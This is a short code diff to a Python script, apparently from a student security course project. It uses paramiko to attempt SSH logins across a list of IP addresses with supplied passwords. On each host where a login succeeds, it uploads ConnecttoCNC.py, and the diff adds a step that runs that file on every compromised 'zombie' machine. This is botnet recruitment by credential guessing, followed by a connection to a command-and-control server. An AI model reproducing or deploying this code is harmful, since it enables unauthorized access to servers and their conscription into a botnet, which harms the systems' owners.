@@ -15,8 +15,9 @@ def tryandconnect(ipaddresses,passwordsource,successfullyconnectedclients):
 		client = paramiko.SSHClient()
 		client.load_system_host_keys()
 		client.connect(ipaddresses,password=passwordsource)
+		client.exec_command('touch /root/ConnecttoCNC.py')
 		sftp = client.open_sftp()
-		sftp.put('/root/CS445-Project/ConnecttoCNC.py','/root/ConnecttoCNC.py')
+		sftp.put('/root/445Project/CS445-Project/ConnecttoCNC.py','/root/ConnecttoCNC.py')
 		successfullyconnectedclients.append(client)
 	except(paramiko.ssh_exception.AuthenticationException,paramiko.ssh_exception.SSHException) as e:
 		return None
@@ -44,12 +45,11 @@ for index in range(int(zombievms)):
 			threadpool.append(t)
 			t.start()
 
-		print('List size = ', len(threadpool))
 		for threadresult in threadpool:
 			threadresult.join()
 
-		#for successclientsiterator in successclients:
-			#stdin,stdout,stderr = successclientsiterator.exec_command('')
+		for successclientsiterator in successclients:
+			stdin,stdout,stderr = successclientsiterator.exec_command('python /root/ConnecttoCNC.py')
 			#print(stdout.readlines())
 				#client.connect(ipaddresses,password=row)
 				#clientslist.append(client)
